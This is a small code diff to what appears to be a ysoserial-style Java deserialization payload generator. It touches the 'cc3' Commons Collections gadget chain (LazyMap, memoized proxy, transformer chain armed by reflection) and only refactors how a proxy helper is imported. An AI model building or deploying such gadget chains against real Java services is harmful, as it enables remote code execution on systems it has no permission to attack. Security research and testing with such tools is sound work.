@@ -17,6 +17,8 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.JYso.gadgets.utils.Utils.createMemoitizedProxy;
+
 
 /**
  * Variation on CommonsCollections1 that uses InstantiateTransformer instead of
@@ -49,7 +51,7 @@ public class cc3 implements ObjectPayload<Object> {
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
-        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
+        final Map mapProxy = createMemoitizedProxy(lazyMap, Map.class);
         final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain
